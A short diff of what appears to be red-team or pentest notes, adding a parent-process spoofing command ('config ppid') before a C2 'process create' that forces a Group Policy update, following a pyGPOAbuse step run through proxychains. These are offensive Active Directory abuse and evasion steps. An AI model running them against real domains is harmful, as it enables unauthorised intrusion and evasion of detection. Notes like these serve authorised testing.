@@ -838,6 +838,7 @@ proxychains -q python3 ~/TOOLS/ACTIVEDIR/pyGPOAbuse/pygpoabuse.py \
 Then force GPO update as any user
 
 ```
+config ppid 1661
 process create --command "cmd.exe /c gpupdate /force"
 ```
 
